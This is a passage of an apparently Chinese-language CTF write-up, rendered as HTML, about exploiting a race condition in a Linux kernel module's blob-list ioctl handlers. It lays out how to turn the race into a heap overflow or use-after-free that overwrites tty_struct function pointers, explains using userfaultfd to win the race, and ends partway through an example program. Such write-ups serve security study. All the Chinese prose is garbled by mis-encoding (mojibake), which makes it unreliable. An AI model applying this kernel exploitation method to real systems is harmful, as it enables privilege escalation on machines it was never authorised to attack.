é™¤æ‰€ä»¥èŠ‚ç‚¹ï¼ŒåŒæ—¶é‡Šæ”¾itr-&gt;dataå’Œitr</p><p>æ³¨æ„è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªåä¸ºblob_listçš„ç»“æ„ä½“</p><h4 id="module-ioctl"><a href="#module-ioctl" class="headerlink" title="module_ioctl"></a>module_ioctl</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_ADD<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_add</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_DEL<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_del</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_get</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_set</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;&#125; request_t;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¦æ±‚æ˜¯ä¸€ä¸ªrequest_tç»“æ„ä½“</p><h4 id="blob-add"><a href="#blob-add" class="headerlink" title="blob_add"></a>blob_add</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_add</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>new<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> <span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//æ£€æŸ¥req->sizeä¸è¶…è¿‡0x1000</span>  new <span class="token operator">=</span> <span class="token punctuation">(</span>blob_list<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>blob_list<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç”³è¯·å®¹çº³blod_listç»“æ„ä½“çš„å †å—</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span><span class="token comment">//æ£€æŸ¥newéç©º</span>  new<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>req<span class="token operator">-></span>size<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç”³è¯·å¤§å°ä¸ºsizeçš„å †å—</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å°†dataæ‹·è´ç»™new->data</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  new<span class="token operator">-></span>size <span class="token operator">=</span> req<span class="token operator">-></span>size<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>    <span class="token function">get_random_bytes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>id<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//äº§ç”Ÿä¸€ä¸ªéšæœºæ•°id</span>  <span class="token function">list_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŠ å…¥åŒé“¾è¡¨</span>  <span class="token keyword">return</span> new<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;  struct list_head list;&#125; blob_list;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="blob-del"><a href="#blob-del" class="headerlink" title="blob_del"></a>blob_del</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_del</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>victim<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ¶‰åŠä¸€ä¸ªå‡½æ•°<code>blob_find_by_id()</code>ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">blob_list <span class="token operator">*</span><span class="token function">blob_find_by_id</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">;</span>  <span class="token function">list_for_each_entry</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>id <span class="token operator">==</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> itr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éå†é“¾è¡¨ï¼Œé€šè¿‡idå¯»æ‰¾ç›®æ ‡èŠ‚ç‚¹</p><h4 id="blob-get"><a href="#blob-get" class="headerlink" title="blob_get"></a>blob_get</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_get</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//æ£€æŸ¥æ‹·è´sizeä¸èƒ½å¤§äºç›®æ ‡èŠ‚ç‚¹çš„size</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token operator">-></span>data<span class="token punctuation">,</span> victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//æ‹·è´æ•°æ®</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="blob-set"><a href="#blob-set" class="headerlink" title="blob_set"></a>blob_set</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒ-åˆ©ç”¨æ€è·¯"><a href="#äºŒ-åˆ©ç”¨æ€è·¯" class="headerlink" title="(äºŒ)åˆ©ç”¨æ€è·¯"></a>(äºŒ)åˆ©ç”¨æ€è·¯</h2><p><img src="/EXP_FILE/083e5331aa7965dabdcca9d9ab7efc6d_MD5.jpeg"></p><p>è½¬åŒ–ä¸ºå †æº¢å‡ºæ€è·¯ï¼š</p><ol><li>å…ˆæ·»åŠ ä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹ï¼ˆblob_addï¼‰</li><li>çº¿ç¨‹1å¯¹å…¶å†™æ“ä½œï¼ˆblob_setï¼‰ï¼Œåœ¨copy_from_usrå‰çº¿ç¨‹2ä¿®æ”¹req-&gt;sizeä¸ºéæ³•å€¼ï¼Œå¹¶å–·å°„tty_structç»“æ„ä½“ï¼Œä»è€Œé€ æˆå †æº¢å‡º</li><li>çº¿ç¨‹1æ‰§è¡Œcopy_from_usrï¼Œä¿®æ”¹tty_structçš„å‡½æ•°æŒ‡é’ˆ</li></ol><p>è½¬åŒ–ä¸ºUAFçš„æ€è·¯ï¼š</p><ol><li>å…ˆæ·»åŠ ä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹ï¼ˆblob_addï¼‰</li><li>çº¿ç¨‹1å¯¹å…¶å†™æ“ä½œï¼ˆblob_setï¼‰ï¼Œåœ¨copy_from_usrå‰çº¿ç¨‹2è¿›è¡Œåˆ é™¤æ“ä½œï¼ˆblob_delï¼‰ï¼Œå¹¶å–·å°„tty_structç»“æ„ä½“</li><li>çº¿ç¨‹1æ‰§è¡Œcopy_from_usrï¼Œä¿®æ”¹tty_structçš„å‡½æ•°æŒ‡é’ˆ</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span><span class="token comment">//ç«äº‰ä½ç½®</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šè¿°æ€è·¯æ˜¯ç›´è§‚çš„ã€‚ç„¶è€Œï¼Œç”±äºé“¾è¡¨æ“ä½œåŒ…å«å¤šä¸ªæ­¥éª¤ï¼Œæœ€ç»ˆæƒ³è¦è¾¾åˆ°ä»¥ä¸Šç†æƒ³çŠ¶æ€æ˜¯ä¸å®¹æ˜“çš„ï¼Œéœ€è¦å¤§é‡å°è¯•ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œä¸Šä¸€èŠ‚çš„æµ‹è¯•æ˜¾ç¤ºï¼Œä¸ç†æƒ³çš„ç«æ€çŠ¶æ€å¯èƒ½ä¼šå¯¼è‡´å†…æ ¸å´©æºƒã€‚åæ–‡å°†ä»‹ç»åˆ©ç”¨Linux userfaultfdæœºåˆ¶æé«˜å†…æ ¸ç«æ€æ¡ä»¶æ¼æ´åˆ©ç”¨æˆåŠŸç‡çš„æ–¹æ³•ã€‚é€šè¿‡åº”ç”¨<code>userfaultfd</code>æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä»¥è¾ƒé«˜çš„æˆåŠŸç‡æ¥è¾¾åˆ°æ‰€éœ€çš„ç«æ€æ¡ä»¶ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯userfaultfd"><a href="#ä»€ä¹ˆæ˜¯userfaultfd" class="headerlink" title="ä»€ä¹ˆæ˜¯userfaultfd"></a>ä»€ä¹ˆæ˜¯userfaultfd</h3><p>æœ‰ä¸€ç§æ”»å‡»æ–¹æ³•åˆ©ç”¨äº†ä¸€ä¸ªåä¸º <code>userfaultfd</code> çš„å‡½æ•°ï¼Œä»¥ä¾¿åˆ©ç”¨åƒè¿™æ ·å¤æ‚æ¡ä»¶ä¸‹çš„å†²çªï¼Œç”šè‡³å°†å†²çªçš„æˆåŠŸç‡æé«˜åˆ° 100%ã€‚</p><p><code>userfaultfd</code>Â æ˜¯ Linux å†…æ ¸ä¸­çš„ä¸€ç§ç‰¹æ®Šæœºåˆ¶ï¼Œå…è®¸ç”¨æˆ·ç©ºé—´ç¨‹åºè‡ªè¡Œå¤„ç†é¡µé¢é”™è¯¯ï¼ˆpage faultï¼‰ã€‚ä¸‹é¢æ˜¯å…¶æ•´ä¸ªæµç¨‹ï¼š<br><img src="/EXP_FILE/9d1012690d1cceec6690bbacba99ba4f_MD5.jpeg"><br>è¦ä½¿ç”¨ userfaultfd ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œé€šè¿‡ ioctl ç›‘è§†ä¸€å—å†…å­˜åŒºåŸŸï¼›åŒæ—¶è¿˜éœ€è¦ä¸“é—¨å¯åŠ¨ä¸€ä¸ªç”¨ä»¥è¿›è¡Œè½®è¯¢çš„çº¿ç¨‹Â <code>uffd monitor</code>ï¼Œè¯¥çº¿ç¨‹ä¼šé€šè¿‡Â <code>poll()</code>Â å‡½æ•°ä¸æ–­è½®è¯¢ï¼Œä»¥<strong>å‘ç°</strong>ç¼ºé¡µå¼‚å¸¸çš„äº§ç”Ÿã€‚</p><ol><li><p>å½“æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿™å—å†…å­˜åŒºåŸŸå†…<strong>è§¦å‘</strong>ç¼ºé¡µå¼‚å¸¸æ—¶ï¼ˆæ¯”å¦‚è¯´ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªåŒ¿åé¡µï¼‰ï¼Œè¯¥çº¿ç¨‹ï¼ˆç§°ä¹‹ä¸º faulting çº¿ç¨‹ï¼‰è¿›å…¥åˆ°å†…æ ¸ä¸­å¤„ç†ç¼ºé¡µå¼‚å¸¸</p></li><li><p>å†…æ ¸ä¼šè°ƒç”¨Â <code>handle_userfault()</code>Â äº¤ç”± userfaultfd å¤„ç†</p></li><li><p>éšå faulting çº¿ç¨‹è¿›å…¥å µå¡çŠ¶æ€ï¼ŒåŒæ—¶å°†ä¸€ä¸ªÂ <code>uffd_msg</code> ç»“æ„é€šè¿‡è¯¥ fd å‘é€ç»™ monitor çº¿ç¨‹</p></li><li><p>monitor çº¿ç¨‹è°ƒç”¨é€šè¿‡ ioctl å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œæœ‰å¦‚ä¸‹å®ï¼Œæ¯ä¸ªå®éƒ½æœ‰å¯¹åº”çš„ç»“æ„ä½“æ¥ä¼ é€’æ•°æ®ï¼š</p><ul><li><code>UFFDIO_COPY</code>ï¼šå°†ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ° faulting page ä¸Š</li><li><code>UFFDIO_ZEROPAGE</code>Â ï¼šå°† faulting page ç½®0</li><li><code>UFFDIO_WAKE</code>ï¼šç”¨äºé…åˆä¸Šé¢ä¸¤é¡¹ä¸­Â <code>UFFDIO_COPY_MODE_DONTWAKE</code>Â å’ŒÂ <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code>Â æ¨¡å¼å®ç°æ‰¹é‡å¡«å……<br>ä»¥UFFDIO_COPYä¸ºä¾‹ï¼š<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>åœ¨å¤„ç†ç»“æŸå monitor çº¿ç¨‹å‘é€ä¿¡å·å”¤é†’ faulting çº¿ç¨‹ç»§ç»­å·¥ä½œ</p></li></ol><p>ä»¥ä¸Šä¾¿æ˜¯ userfaultfd è¿™ä¸ªæœºåˆ¶çš„æ•´ä¸ªæµç¨‹ï¼Œè¯¥æœºåˆ¶æœ€åˆè¢«è®¾è®¡æ¥ç”¨ä»¥è¿›è¡Œè™šæ‹Ÿæœº&#x2F;è¿›ç¨‹çš„è¿ç§»ç­‰ç”¨é€”ï¼Œä½†æ˜¯<strong>é€šè¿‡è¿™ä¸ªæœºåˆ¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿›ç¨‹æ‰§è¡Œæµç¨‹çš„å…ˆåé¡ºåºï¼Œä»è€Œä½¿å¾—å¯¹æ¡ä»¶ç«äº‰çš„åˆ©ç”¨æˆåŠŸç‡å¤§å¹…æé«˜</strong></p><h3 id="æµ‹è¯•ä¾‹ç¨‹"><a href="#æµ‹è¯•ä¾‹ç¨‹" class="headerlink" title="æµ‹è¯•ä¾‹ç¨‹"></a>æµ‹è¯•ä¾‹ç¨‹</h3><p>ä½œè€…æä¾›çš„ä¾‹ç¨‹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>  </span>  <span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>dummy_page<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token 